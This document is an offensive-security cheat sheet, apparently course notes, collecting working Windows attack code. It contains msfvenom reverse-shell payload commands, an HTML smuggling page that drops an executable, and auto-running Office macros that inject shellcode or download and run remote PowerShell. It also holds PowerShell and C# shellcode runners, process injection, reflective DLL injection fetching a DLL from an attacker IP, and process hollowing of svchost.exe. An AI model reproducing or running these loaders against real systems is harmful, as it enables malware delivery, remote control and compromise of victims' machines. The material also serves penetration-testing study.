********** HTML Smuggling **********

# sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o /var/www/html/msfstaged.exe

# base64 /var/www/html/msfstaged.exe

        <html>
            <body>
                <script>
                  function base64ToArrayBuffer(base64) {
            		  var binary_string = window.atob(base64);
            		  var len = binary_string.length;
            		  var bytes = new Uint8Array( len );
            		  for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
            		  return bytes.buffer;
              		}
              		
              		var file ='TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAA...
              		var data = base64ToArrayBuffer(file);
              		var blob = new Blob([data], {type: 'octet/stream'});
              		var fileName = 'msfstaged.exe';
              		
              		var a = document.createElement('a');
              		document.body.appendChild(a);
              		a.style = 'display: none';
              		var url = window.URL.createObjectURL(blob);
              		a.href = url;
              		a.download = fileName;
              		a.click();
              		window.URL.revokeObjectURL(url);
                </script>
            </body>
        </html>

********** Client side code execution with office (VBA) **********

[Code-1]
# msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f vbapplication

        Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

        Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
        
        Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
        
        Function MyMacro()
            Dim buf As Variant
            Dim addr As LongPtr
            Dim counter As Long
            Dim data As Long
            Dim res As Long

        buf = Array(232, 130, 0, 0, 0 )
            addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
            For counter = LBound(buf) To UBound(buf)
                data = buf(counter)
                res = RtlMoveMemory(addr + counter, data, 1)
            Next counter
            res = CreateThread(0, 0, addr, 0, 0, 0)
        End Function 
        Sub Document_Open()
            MyMacro
        End Sub
        Sub AutoOpen()
            MyMacro
        End Sub

********** Powershell Code execution (code-1) **********

# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.232 LPORT=4444 EXITFUNC=thread -f ps1

[Code-1]

# Shell.ps1

        $Kernel32 = @"
        using System;
        using System.Runtime.InteropServices;
        public class Kernel32 {
            [DllImport("kernel32")]
                public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
            [DllImport("kernel32", CharSet=CharSet.Ansi)]
                public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
            [DllImport("kernel32.dll", SetLastError=true)]
                public static extern UInt32 WaitForSingleObject(IntPtr hHandle,UInt32 dwMilliseconds);        
        }
        "@
        Add-Type $Kernel32
        [Byte[]] $buf = 0xfc,0xe8,0x8f,0x0,0x0,0x0,0x60,0x3
        $size = $buf.Length
        [IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);
        [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
        $thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);
        [Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
        
#msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f ps1

    // Macro Script -> Save as doc
        Sub MyMacro()
        Dim str As String
        str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.45.232/shell.ps1') | IEX"
        Shell str, vbHide
        End Sub
        
        Sub AutoOpen()
            MyMacro
        End Sub

********** Powershell Code execution (code-1) **********

# Shell.ps1

          function LookupFunc {          
          	Param ($moduleName, $functionName)
          	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
              Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
                Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
              $tmp=@()
              $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
          	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
          }
          function getDelegateType {
          	Param (
          		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
          		[Parameter(Position = 1)] [Type] $delType = [Void]
          	)
          	$type = [AppDomain]::CurrentDomain.
              DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
              [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
                DefineDynamicModule('InMemoryModule', $false).
                DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
                [System.MulticastDelegate])
            $type.
              DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
                SetImplementationFlags('Runtime, Managed')
            $type.
              DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
                SetImplementationFlags('Runtime, Managed')
          	return $type.CreateType()
          }
          $lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
          [Byte[]] $buf = 0xfc,0xe8,0x8f,0x0,0x0,0x0,0x60,0x31,0xd2,0x64,0x8b,0x52
          [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
          $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
          [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)

        # Doc file

        Sub MyMacro()
        Dim str As String
        str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.45.232/shell.ps1') | IEX"
        Shell str, vbHide
        End Sub
        Sub AutoOpen()
            MyMacro
        End Sub

********** Shellcode runner C# (code-1) **********

  #  msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.45.232 lport=444 -f csharp

          using System;
          using System.Collections.Generic;
          using System.Linq;
          using System.Text;
          using System.Threading.Tasks;
          using System.Diagnostics;
          using System.Runtime.InteropServices;
          
          namespace CSharpReverse
          {
              class Program
              {
                  [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
                  static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
          
                  [DllImport("kernel32.dll")]
                  static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
                  [DllImport("kernel32.dll")]
                  static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
                  static void Main(string[] args)
                  {
                      byte[] buf = new byte[510] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,};
                      int size = buf.Length;
                      IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40); Marshal.Copy(buf, 0, addr, size);
                      IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
                      WaitForSingleObject(hThread, 0xFFFFFFFF);
                  }
              }
          }

********** Shellcode runner C# (code-2) **********

 #  msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.45.232 lport=444 -f csharp

        using System;
        using System.Diagnostics;
        using System.Runtime.InteropServices;
        using System.Windows.Forms;
        
        [ComVisible(true)]
        public class TestClass
        {
            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        
            [DllImport("kernel32.dll")]
            static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
            [DllImport("kernel32.dll")]
            static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
            public TestClass()
            {
                byte[] buf = new byte[602] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,};
                int size = buf.Length;
                IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40); Marshal.Copy(buf, 0, addr, size);
                IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
                WaitForSingleObject(hThread, 0xFFFFFFFF);
            }
            public void RunProcess(string path)
            {
                Process.Start(path);
            }
        }


********** Process Injection C# (code-2) **********

 #  msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.45.232 lport=444 -f csharp

        using System;
        using System.Runtime.InteropServices;
        namespace Inject
        {
            class Program
            {
                [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
                static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        
                [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
                static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,uint dwSize, uint flAllocationType, uint flProtect);
        
                [DllImport("kernel32.dll")]
                static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        
                [DllImport("kernel32.dll")]
                static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
                static void Main(string[] args)
                {
                    IntPtr hProcess = OpenProcess(0x001F0FFF, false, 4988);
                    IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
                    byte[] buf = new byte[739] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,};
                    IntPtr outSize;
                    WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
                    IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr,IntPtr.Zero, 0, IntPtr.Zero);
                }
            }
        }


********** Reflective DLL Injection C#  **********

# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f dll -o /var/www/html/met.dll

        using System;
        using System.Diagnostics;
        using System.Net;
        using System.Runtime.InteropServices;
        using System.Text;
        
        namespace Inject
        {
            class Program
            {
                [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
                static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        
                [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
                static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        
                [DllImport("kernel32.dll")]
                static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        
                [DllImport("kernel32.dll")]
                static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        
                [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
                static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        
                [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
                public static extern IntPtr GetModuleHandle(string lpModuleName);
        
                static void Main(string[] args)
                {
        
                    String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                    String dllName = dir + "\\met.dll";
        
                    WebClient wc = new WebClient();
                    wc.DownloadFile("http://192.168.45.232/met.dll", dllName);
        
                    Process[] expProc = Process.GetProcessesByName("explorer");
                    int pid = expProc[0].Id;
        
                    IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
                    IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
                    IntPtr outSize;
                    Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
                    IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                    IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
                }
            }
        }

  # Powershell -Exec Bypass
        
        $bytes = (New-Object
        System.Net.WebClient).DownloadData('http://192.168.119.120/met.dll')
        $procid = (Get-Process -Name explorer).Id
        
        Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1
        Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid

********** Process Hollowing C#  **********

# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.232 LPORT=443 EXITFUNC=thread -f csharp

        using System;
        using System.Collections.Generic;
        using System.Linq;
        using System.Text;
        using System.Threading.Tasks;
        using System.Threading;
        using System.Runtime.InteropServices;
        
        namespace Hollow
        {
            class Program
            {
                [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
                static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,[In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        
                [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
                struct STARTUPINFO
                {
                    public Int32 cb;
                    public IntPtr lpReserved;
                    public IntPtr lpDesktop;
                    public IntPtr lpTitle;
                    public Int32 dwX;
                    public Int32 dwY;
                    public Int32 dwXSize;
                    public Int32 dwYSize;
                    public Int32 dwXCountChars;
                    public Int32 dwYCountChars;
                    public Int32 dwFillAttribute;
                    public Int32 dwFlags;
                    public Int16 wShowWindow;
                    public Int16 cbReserved2;
                    public IntPtr lpReserved2;
                    public IntPtr hStdInput;
                    public IntPtr hStdOutput;
                    public IntPtr hStdError;
                }
        
                [StructLayout(LayoutKind.Sequential)]
                internal struct PROCESS_BASIC_INFORMATION
                {
                    public IntPtr Reserved1;
                    public IntPtr PebAddress;
                    public IntPtr Reserved2;
                    public IntPtr Reserved3;
                    public IntPtr UniquePid;
                    public IntPtr MoreReserved;
                }
        
                [StructLayout(LayoutKind.Sequential)]
                internal struct PROCESS_INFORMATION
                {
                    public IntPtr hProcess;
                    public IntPtr hThread;
                    public int dwProcessId;
                    public int dwThreadId;
                }
        
                [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
                private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);
        
                [DllImport("kernel32.dll", SetLastError = true)]
                static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,[Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
        
                [DllImport("kernel32.dll", SetLastError = true)]
                public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        
                [DllImport("kernel32.dll", SetLastError = true)]
                private static extern uint ResumeThread(IntPtr hThread);
                static void Main(string[] args)
                {
        
                    STARTUPINFO si = new STARTUPINFO();
                    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
        
                    bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero,
                        IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
        
                    PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
                    uint tmp = 0;
                    IntPtr hProcess = pi.hProcess;
                    ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
                    IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
        
                    byte[] addrBuf = new byte[IntPtr.Size];
                    IntPtr nRead = IntPtr.Zero;
                    ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
                    IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
        
                    byte[] data = new byte[0x200];
                    ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
        
                    uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
                    uint opthdr = e_lfanew_offset + 0x28;
                    uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
                    IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
        
                    byte[] buf = new byte[511] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,};
        
                    WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
        
                    ResumeThread(pi.hThread);
                }
            }
        }
